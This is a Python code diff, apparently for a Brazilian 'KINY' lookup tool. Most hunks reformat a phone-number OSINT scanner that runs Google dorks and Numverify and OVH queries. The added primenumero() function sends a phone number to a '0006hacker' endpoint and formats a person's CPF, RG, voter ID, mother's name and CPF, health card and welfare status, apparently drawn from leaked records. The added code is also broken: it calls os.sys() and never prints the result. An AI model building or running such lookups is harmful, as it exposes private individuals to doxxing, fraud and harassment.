@@ -696,14 +741,15 @@ def gerarlinkwhats():
     num = input('===>')
     print(f'{C}[{G}i{C}] Digite a mensagem.')
     msg = input('===>')
-    url = 'https://api.whatsapp.com/send?phone='+num+'&text='+msg
-    print(f'{C}[{G}i{C}] URL gerada :'+url)
+    url = 'https://api.whatsapp.com/send?phone=' + num + '&text=' + msg
+    print(f'{C}[{G}i{C}] URL gerada :' + url)
     print(f'{C}[{Y}i{C}] Deseja gerar uma nova url?')
     print(f'{C}[{G}1{C}] Sim')
     print(f'{C}[{G}2{C}] Não')
     choice = input('===>')
     if choice == '1':
         gerarlinkwhats()
+
 
 def youtube():
     clear()
@@ -732,6 +778,8 @@ def youtube():
     choice = input('===>')
     if choice == '1':
         youtube()
+
+
 def consultatel():
     os.system('figlet KINY')
     print(f'O que deseja fazer?')
@@ -748,29 +796,87 @@ def consultatel():
     else:
         print(f'{C}[{R}i{C}] Opção inválida')
         time.sleep(3)
+
+
 def primenumero():
-    print(f'{C}[{G}i{C}] Temporariamente Off')
-    time.sleep(2)
-    pass
-        
+    clear()
+    os.sys('figlet KINY')
+    print(f'{C}[{G}i{C}] Digite o numero(ex: 21 9××××××××).')
+    requiem = input('===> ')
+    api = requests.get('https://hollibot.com/0006hacker/tel.php?tel={}'.format(requiem)).json()
+    try:
+        msg = '''
+CPF: {}
+Nome: {} {} {}
+Nome Parentesco: {}
+Sexo: {}
+Data de nascimento: {}
+Status na Receita Federal: {}
+Data de atualização da Receita Federal: {}
+RG: {}
+Orgão Emissor do RG: {}
+UF do RG: {}
+Titulo eleitoral: {}
+Faleceu: {}
+Nacionalidade: {}
+Menor de Idade: {}
+Profilaxia: {}
+Estado civil: {}
+CPF da mãe: {}
+Nome da mãe: {} {} {}
+Nome de parentesco da mãe: {}
+Escolaridade: {}
+CNS: {}
+Bolsa Familia: {}
+    '''.format((int(api["result"][0]["pessoa"]["cadastral"]["CPF"])),
+               api["result"][0]["pessoa"]["cadastral"]["nomePrimeiro"],
+               api["result"][0]["pessoa"]["cadastral"]["nomeMeio"],
+               api["result"][0]["pessoa"]["cadastral"]["nomeUltimo"],
+               api["result"][0]["pessoa"]["cadastral"]["nomeParentesco"],
+               api["result"][0]["pessoa"]["cadastral"]["sexo"],
+               api["result"][0]["pessoa"]["cadastral"]["dataNascimento"],
+               api["result"][0]["pessoa"]["cadastral"]["statusReceitaFederal"],
+               api["result"][0]["pessoa"]["cadastral"]["dataAtualizacaoStatusReceitaFederal"],
+               api["result"][0]["pessoa"]["cadastral"]["rgNumero"],
+               api["result"][0]["pessoa"]["cadastral"]["rgOrgaoEmissor"],
+               api["result"][0]["pessoa"]["cadastral"]["rgUf"],
+               api["result"][0]["pessoa"]["cadastral"]["tituloEleitoral"],
+               api["result"][0]["pessoa"]["cadastral"]["obito"],
+               api["result"][0]["pessoa"]["cadastral"]["nacionalidade"],
+               api["result"][0]["pessoa"]["cadastral"]["menorDeIdade"], api["result"][0]["pessoa"]["cadastral"]["pep"],
+               api["result"][0]["pessoa"]["cadastral"]["estadoCivil"],
+               api["result"][0]["pessoa"]["cadastral"]["maeCPF"],
+               api["result"][0]["pessoa"]["cadastral"]["maeNomePrimeiro"],
+               api["result"][0]["pessoa"]["cadastral"]["maeNomeMeio"],
+               api["result"][0]["pessoa"]["cadastral"]["maeNomeUltimo"],
+               api["result"][0]["pessoa"]["cadastral"]["maeNomeParentesco"],
+               api["result"][0]["pessoa"]["cadastral"]["escolaridade"], api["result"][0]["pessoa"]["cadastral"]["cns"],
+               api["result"][0]["pessoa"]["beneficiarioProgramaSocial"]["bolsaFamilia"])
+    except:
+        msg = '{} :Número não encontrado'.format(requiem)
+
+    print(f'{C}[{Y}i{C}] Deseja fazer uma nova consulta?')
+    print('1.Sim')
+    print('2.Não')
+    OHNO = input("===>")
+    if OHNO == '1' or OHNO == '01':
+        primenumero()
+    if OHNO == '2' or OHNO == '02':
+        pass
+    else:
+        print(f'{C}[{R}i{C}] Opção inválida')
+        time.sleep(3)
+
+
 def phoneinfoga():
-    uagent = []
-    uagent.append(
-        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
-    uagent.append(
-        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
-    uagent.append(
-        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
-    uagent.append(
-        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
-    uagent.append(
-        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
-    uagent.append(
-        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
-    uagent.append(
-        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
-    uagent.append(
-        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0")
+    uagent = ["Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
+              "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
+              "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
+              "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+              "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
+              "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+              "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
+              "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"]
 
     number = ''  # Full number format; e.g: 3312345678
     localNumber = ''  # Local number format; e.g: 06 12 34 56 78
@@ -807,7 +913,9 @@ def phoneinfoga():
             r = reqSession.get(URL + googleAbuseToken, headers=headers)
 
             while r.status_code != 200:
-                print('{}[{}ERROR{}] Você está temporariamente na lista negra da pesquisa do Google. Preencha o captcha no seguinte URL e copie / cole o conteúdo do cookie GOOGLE_ABUSE_EXEMPTION: {}'.format(C,R,C,URL))
+                print(
+                    '{}[{}ERROR{}] Você está temporariamente na lista negra da pesquisa do Google. Preencha o captcha no seguinte URL e copie / cole o conteúdo do cookie GOOGLE_ABUSE_EXEMPTION: {}'.format(
+                        C, R, C, URL))
                 token = input('\nGOOGLE_ABUSE_EXEMPTION=')
                 googleAbuseToken = '&google_abuse=' + token
                 r = reqSession.get(URL + googleAbuseToken, headers=headers)
@@ -839,13 +947,12 @@ def phoneinfoga():
 
             return links
         except Exception as e:
-            print('{}[{}ERROR{}] O pedido falhou. Tente novamente.'.format(C,R,C))
+            print('{}[{}ERROR{}] O pedido falhou. Tente novamente.'.format(C, R, C))
             print(e)
             return []
 
     def formatNumber(InputNumber):
         return re.sub("(?:\+)?(?:[^[0-9]*)", "", InputNumber)
-
 
     def localScan(InputNumber):
         global number
@@ -854,7 +961,7 @@ def phoneinfoga():
         global numberCountryCode
         global numberCountry
 
-        print('{}[{}i{}] Executando verificação local...'.format(C,Y,C))
+        print('{}[{}i{}] Executando verificação local...'.format(C, Y, C))
 
         FormattedPhoneNumber = "+" + formatNumber(InputNumber)
 
@@ -895,7 +1002,6 @@ def phoneinfoga():
             else:
                 print('O número é válido, mas pode não ser possível.')
 
-
     def numverifyScan():
         global number
         print('Executando scan com Numverify.com...')
@@ -929,7 +1035,9 @@ def phoneinfoga():
         }
         try:
             response = requests.request(
-                "GET", "https://numverify.com/php_helper_scripts/phone_api.php?secret_key={}&number={}".format(apiKey, number), data="", headers=headers)
+                "GET",
+                "https://numverify.com/php_helper_scripts/phone_api.php?secret_key={}&number={}".format(apiKey, number),
+                data="", headers=headers)
 
             data = json.loads(response.content.decode('utf-8'))
         except Exception as e:
@@ -941,7 +1049,8 @@ def phoneinfoga():
             return -1
 
         if data["valid"] == False:
-            print(("{}[{}ERROR{}] especifique um número de telefone válido. Exemplo: +5585999999999 (DDD país + DDD estado + número"))
+            print((
+                      "{}[{}ERROR{}] especifique um número de telefone válido. Exemplo: +5585999999999 (DDD país + DDD estado + número"))
             sys.exit()
 
         InternationalNumber = '({}){}'.format(
@@ -960,12 +1069,11 @@ def phoneinfoga():
         elif data["line_type"] == 'mobile':
             print(("Provavelmente é um número de celular, mas ainda pode ser um número VoIP."))
 
-
     def ovhScan():
         global localNumber
         global numberCountry
 
-        print('{}[{}ERROR{}]Executando OVH scan...'.format(C,R,C))
+        print('{}[{}ERROR{}]Executando OVH scan...'.format(C, R, C))
 
         querystring = {"País": numberCountry.lower()}
 
@@ -976,7 +1084,8 @@ def phoneinfoga():
 
         try:
             response = requests.request(
-                "GET", "https://api.ovh.com/1.0/telephony/number/detailedZones", data="", headers=headers, params=querystring)
+                "GET", "https://api.ovh.com/1.0/telephony/number/detailedZones", data="", headers=headers,
+                params=querystring)
             data = json.loads(response.content.decode('utf-8'))
         except Exception as e:
             print('API OVH inacessível. Talvez tente novamente mais tarde.')
@@ -991,7 +1100,9 @@ def phoneinfoga():
                     print(
                         (f"Intervalo numérico:{B} {voip_number['number']}"))
                     print((f"Cidade:{B} {voip_number['city']}"))
-                    print((f"Código postal: {B} {voip_number['zipCode'] if voip_number['zipCode'] is not None else        askForExit()}"))
+                    print((
+                              f"Código postal: {B} {voip_number['zipCode'] if voip_number['zipCode'] is not None else askForExit()}"))
+
     def replaceVariables(string):
         global number
         global internationalNumber
@@ -1002,7 +1113,6 @@ def phoneinfoga():
         string = string.replace('$l', localNumber)
 
         return string
-
 
     def osintIndividualScan():
         global number
@@ -1028,7 +1138,6 @@ def phoneinfoga():
             else:
                 return -1
 
-
     def osintReputationScan():
         global number
         global internationalNumber
@@ -1046,7 +1155,6 @@ def phoneinfoga():
             print(("Procurando por {}...".format(dork['title'])))
             for result in search(dorkRequest, stop=dork['stop']):
                 print(("URL: " + result))
-
 
     def osintSocialMediaScan():
         global number
@@ -1068,7 +1176,6 @@ def phoneinfoga():
             for result in search(dorkRequest, stop=dork['stop']):
                 print(("URL: " + result))
 
-
     def osintDisposableNumScan():
         global number
 
@@ -1084,7 +1191,6 @@ def phoneinfoga():
                 print(("Result found: {}".format(dork['site'])))
                 print(("URL: " + result))
                 askForExit()
-
 
     def osintScan(rerun=False):
         global number
@@ -1121,9 +1227,11 @@ def phoneinfoga():
 
         print(("Procurando documentos... (limit=10)"))
         if customFormatting:
-            req = '[ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv | ext:txt     | ext:xls] && [intext:"{}"]'.format(customFormatting)
+            req = '[ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv | ext:txt     | ext:xls] && [intext:"{}"]'.format(
+                customFormatting)
         else:
-            req = '[ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv | ext:txt | ext:xls] && [intext:"{}" | intext:"{}"]'.format(internationalNumber, localNumber)
+            req = '[ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv | ext:txt | ext:xls] && [intext:"{}" | intext:"{}"]'.format(
+                internationalNumber, localNumber)
         for result in search(req, stop=10):
             print(("Resultado encontrado: " + result))
 
@@ -1177,7 +1285,6 @@ def phoneinfoga():
         else:
             return -1
 
-
     def askForExit():
         if not output:
             user_input = input("Continuar scanning?[y/n] ")
@@ -1187,7 +1294,6 @@ def phoneinfoga():
             else:
 
                 sys.exit()
-
 
     def scanNumber(InputNumber):
         global number
@@ -1202,19 +1308,17 @@ def phoneinfoga():
 
         if not number:
             print((f"Erro: o número{B}{formatNumber(InputNumber)}{C} inválido."))
-            #again()
+            # again()
 
         numverifyScan()
         ovhScan()
         osintScan()
 
         print("Scan concluído.")
-        #again()
+        # again()
 
-        #if not no_ansi and not output:
-            #print(Style.RESET_ALL)
-
-
+        # if not no_ansi and not output:
+        # print(Style.RESET_ALL)
 
     def download_file(url, target_path):
         response = requests.get(url, stream=True)
@@ -1230,7 +1334,6 @@ def phoneinfoga():
             'social_medias.json'
         ]
 
-
     def main():
 
         requests.packages.urllib3.disable_warnings()
@@ -1239,17 +1342,20 @@ def phoneinfoga():
             requests.packages.urllib3.contrib.pyopenssl.DEFAULT_SSL_CIPHER_LIST += 'HIGH:!DH:!aNULL'
         except AttributeError:
             pass
+
     number = input(f"{C}[{G}i{C}] Informe os números (sem espaços, parênteses e traço): {B}")
     scanNumber(number)
 
     def again():
-        again=input("\n" + f'{C}[{G}+{C}] Deseja realizar uma nova consulta?[{G}s{C}/{R}n{C}]: ')
+        again = input("\n" + f'{C}[{G}+{C}] Deseja realizar uma nova consulta?[{G}s{C}/{R}n{C}]: ')
         if again == "s" or again == "sim":
-              clear()
-              main()
+            clear()
+            main()
         elif again == "nao" or again == "n":
-              pass
+            pass
+
     main()
+
 
 def nomemae():
     print(f'{C}[{G}i{C}] Temporariamente Off')
